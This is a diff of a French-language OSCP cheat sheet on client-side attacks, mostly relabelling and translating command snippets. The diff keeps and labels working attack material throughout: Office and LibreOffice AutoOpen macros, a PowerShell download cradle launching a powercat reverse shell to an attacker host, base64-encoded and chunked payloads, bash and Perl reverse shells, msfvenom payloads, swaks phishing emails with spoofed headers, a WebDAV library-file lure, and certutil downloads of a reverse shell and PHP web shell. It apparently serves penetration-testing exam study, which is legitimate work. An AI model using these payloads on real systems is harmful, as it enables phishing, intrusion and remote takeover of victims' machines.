@@ -10,8 +10,8 @@ Comprendre les vecteurs d'interaction avec les postes utilisateurs.
 
 ## MACROS
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `sub` pour la rubrique « MACROS ».
 
 ```text
 Sub AutoOpen()
@@ -27,6 +27,8 @@ Sub MyMacro()
 End Sub
 ```
 
+
+Commande `sub` pour la rubrique « MACROS ».
 
 ```text
 Sub AutoOpen()
@@ -45,10 +47,14 @@ End Sub
 ```
 
 
+Commande `iex` pour la rubrique « MACROS ».
+
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/powercat.ps1]');powercat -c [attacker-ip] -p [port] -e powershell
 ```
 
+
+Exemple technique pour la rubrique « MACROS ».
 
 ```powershell
 $text = "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
@@ -56,6 +62,8 @@ $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($text))
 Write-Output $encoded
 ```
 
+
+Commande `cmd_str` pour la rubrique « MACROS ».
 
 ```python
 cmd_str = "[Your Base64 Encoded PowerShell Command]"
@@ -66,6 +74,8 @@ for i in range(0, len(cmd_str), chunk_size):
     print(f'Str = Str + "{cmd_str[i:i+chunk_size]}"')
 ```
 
+
+Commande `sub` pour la rubrique « MACROS ».
 
 ```text
 Sub AutoOpen()
@@ -94,10 +104,14 @@ End Sub
 Observer les permissions et la configuration de Windows.
 
 
+Commande `wsgidav` pour la rubrique « Windows Library Files ».
+
 ```bash
 wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 ```
 
+
+Commande `powershell.exe` pour la rubrique « Windows Library Files ».
 
 ```powershell
 # Create the file as a shortcut in the Windows system to prepare the attack
@@ -105,10 +119,11 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 ```
 
 
-```text
-.Library-ms
-```
+**Paramètres et repères :**
+`.Library-ms`  
 
+
+Exemple technique pour la rubrique « Windows Library Files ».
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -133,10 +148,10 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://
 ```
 
 
-## Advanced Exploitation
+## Avancé Exploitation
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `sub` pour la rubrique « Avancé Exploitation ».
 
 ```text
 Sub AutoOpen()
@@ -156,6 +171,8 @@ End Sub
 ```
 
 
+Commande `sub` pour la rubrique « Avancé Exploitation ».
+
 ```text
 Sub AutoOpen()
     MyMacro
@@ -173,6 +190,8 @@ End Sub
 ```
 
 
+Exemple technique pour la rubrique « Avancé Exploitation ».
+
 ```powershell
 # Using Encodings
 $text = "[Your PowerShell Command]"
@@ -184,6 +203,8 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 ```
 
 
+Exemple technique pour la rubrique « Avancé Exploitation ».
+
 ```html
 <script>
     var cmd = "[Your JavaScript Command]";
@@ -191,6 +212,8 @@ powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCo
 </script>
 ```
 
+
+Commande `var` pour la rubrique « Avancé Exploitation ».
 
 ```javascript
 var cmd = "";
@@ -200,20 +223,17 @@ eval(cmd);
 ```
 
 
+Commande `net` pour la rubrique « Avancé Exploitation ».
+
 ```powershell
 net use Z: \\[webdav-server-ip]\DavWWWRoot /user:[username] [password]
 ```
 
 
-## Send Emails
-
-Commandes, paramètres et exemples associés à cette technique.
+### Courriel simple
 
 
-### Normal Email
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `swaks` pour la rubrique « Courriel simple ».
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -222,45 +242,15 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ```
 
 
-```text
--t
-```
+**Paramètres et repères :**
+`-t` · `--from` · `--attach` · `--server`  
+`--body` · `--header` · `--suppress-data`  
 
 
-```text
---from
-```
+### Courriel avec authentification
 
 
-```text
---attach
-```
-
-
-```text
---server
-```
-
-
-```text
---body
-```
-
-
-```text
---header
-```
-
-
-```text
---suppress-data
-```
-
-
-### Email with Authentication
-
-Commandes, paramètres et exemples associés à cette technique.
-
+Commande `swaks` pour la rubrique « Courriel avec authentification ».
 
 ```bash
 sudo swaks -t <recipient@example.com> --from <sender@example.com> \
@@ -270,25 +260,21 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 ```
 
 
+Commande `--auth` pour la rubrique « Courriel avec authentification ».
+
 ```text
 --auth LOGIN
 ```
 
 
-```text
---auth-user
-```
-
-
-```text
---auth-password
-```
+**Paramètres et repères :**
+`--auth-user` · `--auth-password`  
 
 
 ### Email with Custom Headers for Social Engineering
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `swaks` pour la rubrique « Email with Custom Headers for Social Engineering ».
 
 ```bash
 sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
@@ -297,20 +283,14 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 ```
 
 
-```text
-X-Priority
-```
-
-
-```text
-Importance
-```
+**Paramètres et repères :**
+`X-Priority` · `Importance`  
 
 
 ### Alternative Tool sendemail
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `sendemail` pour la rubrique « Alternative Tool sendemail ».
 
 ```bash
 sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
@@ -318,52 +298,15 @@ sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
 ```
 
 
-```text
-sendemail
-```
-
-
-```text
--f
-```
-
-
-```text
--t
-```
-
-
-```text
--s
-```
-
-
-```text
-192.168.203.140:25
-```
-
-
-```text
--u
-```
-
-
-```text
--m
-```
-
-
-```text
--a
-```
+**Paramètres et repères :**
+`sendemail` · `-f` · `-t` · `-s`  
+`192.168.203.140:25` · `-u` · `-m` · `-a`  
 
 
 ### Comparison Summary
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-**Authentication**
+**Authentification**
 
 No · Yes · No · No
 
@@ -373,7 +316,7 @@ No · Yes · No · No
 Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only
 
 
-**SMTP Authentication**
+**SMTP Authentification**
 
 No · Yes · No · No
 
@@ -388,15 +331,12 @@ No · No · Yes (with custom headers) · No
 Moderate · Moderate · Moderate · Simple
 
 
-## Exploiting LibreOffice Macros for Payload Execution
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Cibles Linux
 
 Examiner les permissions et la configuration de Linux.
 
+
+Commande `echo` pour la rubrique « Cibles Linux ».
 
 ```bash
 echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh
@@ -418,20 +358,25 @@ echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ```
 
 
+Commande `-f` pour la rubrique « Cibles Linux ».
+
 ```text
 -f elf
 ```
 
+
+Commande `-o` pour la rubrique « Cibles Linux ».
 
 ```text
 -o shell.elf
 ```
 
 
-```text
-shell.elf
-```
+**Paramètres et repères :**
+`shell.elf`  
 
+
+Commande `sub` pour la rubrique « Cibles Linux ».
 
 ```text
 Sub RunShell
@@ -445,25 +390,29 @@ End Sub
 ```
 
 
+Commande `python3` pour la rubrique « Cibles Linux ».
+
 ```bash
 python3 -m http.server 80
 ```
 
 
-```sql
-update.odt
-```
+**Paramètres et repères :**
+`update.odt`  
 
+
+Ouvrir un port d'écoute avec Netcat.
 
 ```bash
 nc -lvnp 4444
 ```
 
 
-```text
-swaks
-```
+**Paramètres et repères :**
+`swaks`  
 
+
+Commande `swaks` pour la rubrique « Cibles Linux ».
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -484,90 +433,77 @@ swaks --to target@example.com --from emmanuel@example.com \
 Observer les permissions et la configuration de Windows.
 
 
+Commande `msfvenom` pour la rubrique « Cibles Windows ».
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta
 ```
 
+
+Commande `-f` pour la rubrique « Cibles Windows ».
 
 ```text
 -f hta-psh
 ```
 
 
+Commande `-o` pour la rubrique « Cibles Windows ».
+
 ```text
 -o evil.hta
 ```
 
 
-```text
-evil.hta
-```
+**Paramètres et repères :**
+`evil.hta` · `.hta` · `msfvenom` · `ps1`  
+`exe`  
 
 
-```text
-evil.hta
-```
-
-
-```text
-.hta
-```
-
-
-```bash
-msfvenom
-```
-
-
-```text
-ps1
-```
-
-
-```text
-exe
-```
-
+Commande `-f` pour la rubrique « Cibles Windows ».
 
 ```text
 -f exe -o evil.exe
 ```
 
 
-```text
-vbs
-```
+**Paramètres et repères :**
+`vbs`  
 
+
+Commande `-f` pour la rubrique « Cibles Windows ».
 
 ```text
 -f vbs -o evil.vbs
 ```
 
 
-```text
-ps1
-```
+**Paramètres et repères :**
+`ps1`  
 
+
+Commande `-f` pour la rubrique « Cibles Windows ».
 
 ```text
 -f ps1 -o script.ps1
 ```
 
 
-```text
-dll
-```
+**Paramètres et repères :**
+`dll`  
 
+
+Commande `-f` pour la rubrique « Cibles Windows ».
 
 ```text
 -f dll -o payload.dll
 ```
 
 
-```text
-evil.hta
-```
+**Paramètres et repères :**
+`evil.hta`  
 
+
+Commande `s` pour la rubrique « Cibles Windows ».
 
 ```python
 # Python script to split the payload into 50-character chunks
@@ -580,60 +516,41 @@ for i in range(0, len(s), n):
 ```
 
 
-```text
-exploit.ods
-```
+**Paramètres et repères :**
+`exploit.ods` · `Tools` · `Options` · `LibreOffice`  
+`Security`  
 
 
-```text
-Tools
-```
-
-
-```text
-Options
-```
-
-
-```text
-LibreOffice
-```
-
-
-```text
-Security
-```
-
+Commande `macro` pour la rubrique « Cibles Windows ».
 
 ```text
 Macro Security
 ```
 
 
-```text
-Tools
-```
+**Paramètres et repères :**
+`Tools` · `Macros`  
 
 
-```text
-Macros
-```
-
+Commande `organize` pour la rubrique « Cibles Windows ».
 
 ```text
 Organize Macros
 ```
 
 
+Commande `libreoffice` pour la rubrique « Cibles Windows ».
+
 ```text
 LibreOffice Basic
 ```
 
 
-```text
-Exploit
-```
+**Paramètres et repères :**
+`Exploit`  
 
+
+Commande `rem` pour la rubrique « Cibles Windows ».
 
 ```text
 REM ***** BASIC *****
@@ -649,50 +566,61 @@ End Sub
 ```
 
 
+Exemple technique pour la rubrique « Cibles Windows ».
+
 ```text
 <INSERT_YOUR_PAYLOAD_CHUNKS>
 ```
 
 
-```text
--nop
-```
+**Paramètres et repères :**
+`-nop`  
 
+
+Commande `-w` pour la rubrique « Cibles Windows ».
 
 ```text
 -w hidden
 ```
 
 
-```text
-Shell
-```
+**Paramètres et repères :**
+`Shell`  
 
+
+Commande `shell` pour la rubrique « Cibles Windows ».
 
 ```text
 Shell Str, 1
 ```
 
+
+Commande `shell` pour la rubrique « Cibles Windows ».
 
 ```text
 Shell(Str)
 ```
 
 
+Commande `shell` pour la rubrique « Cibles Windows ».
+
 ```text
 Shell Str, 1
 ```
 
 
-```text
-Shell
-```
+**Paramètres et repères :**
+`Shell`  
 
+
+Ouvrir un port d'écoute avec Netcat.
 
 ```bash
 nc -lvnp 444
 ```
 
+
+Commande `swaks` pour la rubrique « Cibles Windows ».
 
 ```bash
 swaks --to target@example.com --from emmanuel@example.com \
@@ -703,15 +631,18 @@ swaks --to target@example.com --from emmanuel@example.com \
 ```
 
 
-```text
-exploit.ods
-```
+**Paramètres et repères :**
+`exploit.ods`  
 
+
+Commande `python3` pour la rubrique « Cibles Windows ».
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+
+Afficher des informations de la session ou du système.
 
 ```bash
 systeminfo
@@ -720,11 +651,14 @@ ipconfig /all
 ```
 
 
+Commande `cd` pour la rubrique « Cibles Windows ».
+
 ```text
 cd C:\xampp\htdocs && certutil -urlcache -split -f http://[attacker_ip]/rev.exe && certutil -urlcache -split -f http://[attacker_ip]/shell.pHp
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
